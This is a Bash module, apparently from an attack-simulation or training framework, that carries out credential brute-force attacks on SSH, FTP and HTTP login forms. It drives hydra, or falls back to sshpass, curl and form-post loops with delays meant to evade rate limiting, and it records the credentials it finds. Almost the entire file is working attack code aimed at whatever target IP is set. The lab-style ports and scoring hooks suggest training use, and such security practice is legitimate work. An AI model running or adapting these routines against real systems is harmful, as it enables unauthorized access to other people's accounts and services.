#!/usr/bin/env bash
# Brute-force attacks (SSH, FTP, HTTP) — hydra-accelerated with credential loops.
# Uses engine primitives: mission_brief, phase_banner, fake_shell, bar, waf_tracker, ops, debrief_card.
# Callbacks: payloads_bruteforce_creds, traffic_form_post, target_ensure_set, results_record.
# Sourced, not executed.

_bruteforce_sleep() {
    echo "    [*] sleeping 1s to evade rate-limiting..."
    sleep 1
}

bruteforce_ssh() {
    target_ensure_set || { echo "[bruteforce-ssh] No target set."; return 1; }
    _engine_reset_waf
    mission_brief "SSH Brute Force" "T1110" "TA0006 — CREDENTIAL ACCESS" "loud"
    phase_banner "CREDENTIAL ACCESS" "TA0006"

    local found="" cred user pass attempt=0 total="${#payloads_bruteforce_creds[@]}"
    local waf_stats

    if command -v hydra >/dev/null 2>&1; then
        local userlist passlist hydra_output hydra_rc
        userlist="$(mktemp)"
        passlist="$(mktemp)"
        printf '%s\n' "${payloads_bruteforce_creds[@]}" | cut -d: -f1 | sort -u > "$userlist"
        printf '%s\n' "${payloads_bruteforce_creds[@]}" | cut -d: -f2 | sort -u > "$passlist"

        printf '\033[1;32mroot@kali:~#\033[0m \033[1mhydra -t 4 -s 2222 -L %s -P %s %s ssh\033[0m\n' \
            "$userlist" "$passlist" "${TARGET_IP}"
        hydra_output="$(hydra -t 4 -L "$userlist" -P "$passlist" -s 2222 "${TARGET_IP}" ssh 2>&1)"
        hydra_rc=$?
        printf '%s\n' "$hydra_output"

        local hydra_found_count=0
        while IFS= read -r line; do
            if [[ "$line" =~ login:[[:space:]]*([^[:space:]]+)[[:space:]]+password:[[:space:]]*(.+) ]]; then
                hydra_found_count=$((hydra_found_count + 1))
                if [ -z "$found" ]; then
                    found="${BASH_REMATCH[1]}:${BASH_REMATCH[2]}"
                fi
            fi
        done <<< "$hydra_output"

        BNB_ENGINE_PAYLOAD_TOTAL="$total"
        BNB_ENGINE_WAF_BYPASSED="$hydra_found_count"
        BNB_ENGINE_WAF_BLOCKED=$((total - hydra_found_count))

        rm -f "$userlist" "$passlist"
    elif command -v sshpass >/dev/null 2>&1; then
        printf '\033[1;32mroot@kali:~#\033[0m \033[1msshpass + ssh -p 2222\033[0m\n'

        for cred in "${payloads_bruteforce_creds[@]}"; do
            user="${cred%%:*}"
            pass="${cred##*:}"
            attempt=$((attempt + 1))
            bar "$attempt" "$total"

            if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p 2222 "${user}@${TARGET_IP}" true 2>/dev/null; then
                waf_tracker "200" "ssh:${user}:${pass}"
                printf '\n'
                echo "[SUCCESS] ${user}:${pass} (attempt ${attempt}/${total})"
                found="${user}:${pass}"
                break
            else
                waf_tracker "403" "ssh:${user}:${pass}"
            fi
            _bruteforce_sleep
        done
        printf '\n'
    else
        waf_stats="blocked:0  bypassed:0  total:0"
        results_record "bruteforce_ssh" "FAILED" "loud" "" "$waf_stats" "no hydra/sshpass available"
        ops "loud"
        debrief_card "FAILED" "T1110" "loud"
        return 1
    fi

    waf_stats="blocked:${BNB_ENGINE_WAF_BLOCKED}  bypassed:${BNB_ENGINE_WAF_BYPASSED}  total:${BNB_ENGINE_PAYLOAD_TOTAL}"

    if [ -n "$found" ]; then
        results_record "bruteforce_ssh" "SUCCESS" "loud" "TA0006" "$waf_stats" "credentials found: ${found}"
        ops "loud"
        debrief_card "SUCCESS" "T1110" "loud"
    else
        results_record "bruteforce_ssh" "FAILED" "loud" "TA0006" "$waf_stats" "no working SSH credentials found"
        ops "loud"
        debrief_card "FAILED" "T1110" "loud"
    fi
}

bruteforce_ftp() {
    target_ensure_set || { echo "[bruteforce-ftp] No target set."; return 1; }
    _engine_reset_waf
    mission_brief "FTP Brute Force" "T1110" "TA0006 — CREDENTIAL ACCESS" "loud"
    phase_banner "CREDENTIAL ACCESS" "TA0006"

    local found="" cred user pass attempt=0 total="${#payloads_bruteforce_creds[@]}"
    local waf_stats

    if command -v hydra >/dev/null 2>&1; then
        local userlist passlist hydra_output hydra_rc
        userlist="$(mktemp)"
        passlist="$(mktemp)"
        printf '%s\n' "${payloads_bruteforce_creds[@]}" | cut -d: -f1 | sort -u > "$userlist"
        printf '%s\n' "${payloads_bruteforce_creds[@]}" | cut -d: -f2 | sort -u > "$passlist"

        printf '\033[1;32mroot@kali:~#\033[0m \033[1mhydra -t 4 -s 2121 -L %s -P %s %s ftp\033[0m\n' \
            "$userlist" "$passlist" "${TARGET_IP}"
        hydra_output="$(hydra -t 4 -L "$userlist" -P "$passlist" -s 2121 "${TARGET_IP}" ftp 2>&1)"
        hydra_rc=$?
        printf '%s\n' "$hydra_output"

        local hydra_found_count=0
        while IFS= read -r line; do
            if [[ "$line" =~ login:[[:space:]]*([^[:space:]]+)[[:space:]]+password:[[:space:]]*(.+) ]]; then
                hydra_found_count=$((hydra_found_count + 1))
                if [ -z "$found" ]; then
                    found="${BASH_REMATCH[1]}:${BASH_REMATCH[2]}"
                fi
            fi
        done <<< "$hydra_output"

        BNB_ENGINE_PAYLOAD_TOTAL="$total"
        BNB_ENGINE_WAF_BYPASSED="$hydra_found_count"
        BNB_ENGINE_WAF_BLOCKED=$((total - hydra_found_count))

        rm -f "$userlist" "$passlist"
    else
        printf '\033[1;32mroot@kali:~#\033[0m \033[1mcurl ftp://user:pass@%s:2121/\033[0m\n' "${TARGET_IP}"

        for cred in "${payloads_bruteforce_creds[@]}"; do
            user="${cred%%:*}"
            pass="${cred##*:}"
            attempt=$((attempt + 1))
            bar "$attempt" "$total"

            if curl -s --connect-timeout 3 "ftp://${user}:${pass}@${TARGET_IP}:2121/" -o /dev/null; then
                waf_tracker "200" "ftp:${user}:${pass}"
                printf '\n'
                echo "[SUCCESS] ${user}:${pass} (attempt ${attempt}/${total})"
                found="${user}:${pass}"
                break
            else
                waf_tracker "403" "ftp:${user}:${pass}"
            fi
            _bruteforce_sleep
        done
        printf '\n'
    fi

    waf_stats="blocked:${BNB_ENGINE_WAF_BLOCKED}  bypassed:${BNB_ENGINE_WAF_BYPASSED}  total:${BNB_ENGINE_PAYLOAD_TOTAL}"

    if [ -n "$found" ]; then
        results_record "bruteforce_ftp" "SUCCESS" "loud" "TA0006" "$waf_stats" "credentials found: ${found}"
        ops "loud"
        debrief_card "SUCCESS" "T1110" "loud"
    else
        results_record "bruteforce_ftp" "FAILED" "loud" "TA0006" "$waf_stats" "no working FTP credentials found"
        ops "loud"
        debrief_card "FAILED" "T1110" "loud"
    fi
}

bruteforce_http() {
    target_ensure_set || { echo "[bruteforce-http] No target set."; return 1; }
    _engine_reset_waf
    mission_brief "HTTP Login Brute Force" "T1110" "TA0006 — CREDENTIAL ACCESS" "loud"
    phase_banner "CREDENTIAL ACCESS" "TA0006"

    local found="" cred user pass code response attempt=0 total="${#payloads_bruteforce_creds[@]}"
    local waf_stats

    printf '\033[1;32mroot@kali:~#\033[0m \033[1mhydra -L users.txt -P passes.txt %s http-post-form "/login:username=^USER^&password=^PASS^:F=403"\033[0m\n' \
        "${TARGET_IP}:${TARGET_PORT:-8080}"

    for cred in "${payloads_bruteforce_creds[@]}"; do
        user="${cred%%:*}"
        pass="${cred##*:}"
        attempt=$((attempt + 1))
        bar "$attempt" "$total"

        response="$(traffic_form_post "http://${TARGET_IP}:${TARGET_PORT:-8080}/login" "username=${user}&password=${pass}" "hydra_ssh")"
        code="$(echo "$response" | tail -1)"

        if [ "$code" = "200" ]; then
            waf_tracker "$code" "http:${user}:${pass}"
            printf '\n'
            echo "[SUCCESS] ${user}:${pass} (HTTP ${code}, attempt ${attempt}/${total})"
            found="${user}:${pass}"
            break
        else
            waf_tracker "$code" "http:${user}:${pass}"
        fi
        _bruteforce_sleep
    done
    printf '\n'

    waf_stats="blocked:${BNB_ENGINE_WAF_BLOCKED}  bypassed:${BNB_ENGINE_WAF_BYPASSED}  total:${BNB_ENGINE_PAYLOAD_TOTAL}"

    if [ -n "$found" ]; then
        results_record "bruteforce_http" "SUCCESS" "loud" "TA0006" "$waf_stats" "credentials found: ${found}"
        ops "loud"
        debrief_card "SUCCESS" "T1110" "loud"
    else
        results_record "bruteforce_http" "FAILED" "loud" "TA0006" "$waf_stats" "no working HTTP credentials found"
        ops "loud"
        debrief_card "FAILED" "T1110" "loud"
    fi
}
